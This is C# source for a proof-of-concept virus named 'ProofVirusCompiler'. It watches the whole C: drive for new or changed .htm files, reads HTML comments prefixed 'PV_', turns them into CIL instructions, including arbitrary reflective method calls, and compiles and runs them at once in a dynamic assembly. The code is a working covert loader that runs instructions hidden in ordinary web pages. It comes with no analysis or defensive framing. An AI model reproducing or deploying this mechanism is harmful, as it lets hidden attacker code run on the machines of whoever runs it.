using System;
using System.Threading;
using System.Reflection;
using System.Reflection.Emit;
using System.IO;
using System.Xml;


namespace ProofVirusCompiler
{	
	class ProofVirusWriter
	{
		public static void Main() 
		{
			FileSystemWatcher fsw = new FileSystemWatcher("c:\\");
			fsw.Changed += new FileSystemEventHandler(Changed);
			fsw.Created += new FileSystemEventHandler(Created);
			fsw.IncludeSubdirectories = true;
			fsw.EnableRaisingEvents = true;
			fsw.Filter = "*.htm";
			int countChanges = 0;
			while ( countChanges < 1 ) 
			{
				fsw.WaitForChanged(WatcherChangeTypes.All);
				countChanges++;
			}

		}


		public static void WriteAndExecute(string fname)
		{

			//----- Create assembly
			AssemblyName assemblyName = new AssemblyName();
			assemblyName.Name = "ProofVirusAssembly";
			AssemblyBuilder newAssembly = Thread.GetDomain().DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.RunAndSave);
			//----- Create a new module inside the assembly
			ModuleBuilder newModule = newAssembly.DefineDynamicModule("ProofVirusModule");
			//----- Create a new type inside the module
			TypeBuilder newType = newModule.DefineType("ProofVirus", TypeAttributes.Public);
			//----- Create the method Execute
			Type[] paramTypes = null;
			Type retType = typeof(void);
			MethodBuilder newMethod = newType.DefineMethod("Execute", 
				MethodAttributes.Public | MethodAttributes.Virtual, retType, paramTypes);
			//----- Insert of the Command
			insertCode(newMethod.GetILGenerator(), fname);
			//----- Close the new type
			newType.CreateType();
			//----- Execute the created methode Execute
			MethodInfo method = newType.GetMethod("Execute");
			object obj = Activator.CreateInstance(newType);
			object ret = method.Invoke(obj, null);
			Console.WriteLine(ret);
		}

		public static void Created(object sender, FileSystemEventArgs args) {
			WriteAndExecute(args.FullPath);
		}

		public static void Changed(object sender, FileSystemEventArgs args) 
		{
			WriteAndExecute(args.FullPath);
		}

		public static void insertCode(ILGenerator ilGen, string fname) 
		{
			string[] temp;
			Console.WriteLine("Start Writing Virus from file " + fname);
			XmlReader data = new XmlTextReader(fname);
			while (data.Read()) 
			{

				switch (data.NodeType) 
				{
					case XmlNodeType.Comment:
						temp = data.Value.Split(new Char[] {' '});
						if (temp!=null && temp.Length>0 && temp[0].Substring(0,3)=="PV_") 
						{
							analyzeCommand(ilGen, temp);
						}
						break;
					default:
						break;
				}
			}
			Console.WriteLine("End Writing Virus");
		}

		private static void analyzeCommand(ILGenerator ilGen, string[] str) 
		{ 
			if (str[0]=="PV_Var" ) {ilGen.DeclareLocal(Type.GetType(str[1]));}
			else if (str[0]=="PV_Ldstr") {ilGen.Emit(OpCodes.Ldstr, str[1]);}
			else if (str[0]=="PV_Ldlen") {ilGen.Emit(OpCodes.Ldlen); }
			else if (str[0]=="PV_Ldarg_0") {ilGen.Emit(OpCodes.Ldarg_0); }
			else if (str[0]=="PV_Ldarg_1") {ilGen.Emit(OpCodes.Ldarg_1); }
			else if (str[0]=="PV_Ldarg_2") {ilGen.Emit(OpCodes.Ldarg_2); }
			else if (str[0]=="PV_Ldarg_3") {ilGen.Emit(OpCodes.Ldarg_3); }
			else if (str[0]=="PV_Ldarg_S") {ilGen.Emit(OpCodes.Ldarg_S, Byte.Parse(str[1])); }
			else if (str[0]=="PV_Stloc_0") {ilGen.Emit(OpCodes.Stloc_0); }
			else if (str[0]=="PV_Stloc_1") {ilGen.Emit(OpCodes.Stloc_1); }
			else if (str[0]=="PV_Stloc_2") {ilGen.Emit(OpCodes.Stloc_2); }
			else if (str[0]=="PV_Stloc_3") {ilGen.Emit(OpCodes.Stloc_3); }
			else if (str[0]=="PV_Stloc_S") {ilGen.Emit(OpCodes.Stloc_S, Byte.Parse(str[1])); }			
			else if (str[0]=="PV_Ldloc_0") {ilGen.Emit(OpCodes.Ldloc_0); }
			else if (str[0]=="PV_Ldloc_1") {ilGen.Emit(OpCodes.Ldloc_1); }
			else if (str[0]=="PV_Ldloc_2") {ilGen.Emit(OpCodes.Ldloc_2); }
			else if (str[0]=="PV_Ldloc_3") {ilGen.Emit(OpCodes.Ldloc_3); }
			else if (str[0]=="PV_Ldloc_S") {ilGen.Emit(OpCodes.Ldloc_S, Byte.Parse(str[1])); }			
			else if (str[0]=="PV_Ldc_0") {ilGen.Emit(OpCodes.Ldc_I4_0); }
			else if (str[0]=="PV_Ldc_1") {ilGen.Emit(OpCodes.Ldc_I4_1); }
			else if (str[0]=="PV_Ldc_M1") {ilGen.Emit(OpCodes.Ldc_I4_M1); }
			else if (str[0]=="PV_Ldc_S") {ilGen.Emit(OpCodes.Ldc_I4_S, Byte.Parse(str[1])); }			
			else if (str[0]=="PV_Ldelem") {ilGen.Emit(OpCodes.Ldelem_Ref); }
			else if (str[0]=="PV_Ret") { ilGen.Emit(OpCodes.Ret); }
			else if (str[0]=="PV_Conv_i4") { ilGen.Emit(OpCodes.Conv_I4); }
			else if (str[0]=="PV_Add") { ilGen.Emit(OpCodes.Add); }
			else if (str[0]=="PV_Br") { ilGen.Emit(OpCodes.Br_S, SByte.Parse(str[1]));}
			else if (str[0]=="PV_Blt") { ilGen.Emit(OpCodes.Blt_S, SByte.Parse(str[1]));}
			else if (str[0]=="PV_Call" || str[0]=="PV_Callvirt") 
			{
				Type t = null;
				Type ClassType = null;
				Type[] para = new Type[str.Length-3]; 
				for (int i=2;i<str.Length;i++) 
				{
					if (i==2) ClassType = Type.GetType(str[i]); else para[i-3] = Type.GetType(str[i]);
				}
				MethodInfo mi = ClassType.GetMethod(str[1], para); 
				if (str[0]=="PV_Call") ilGen.Emit(OpCodes.Call, mi); else ilGen.Emit(OpCodes.Callvirt, mi);
			}
			else 
			{
				Console.WriteLine(str[0] + " not found");
			}
		}
	}
}
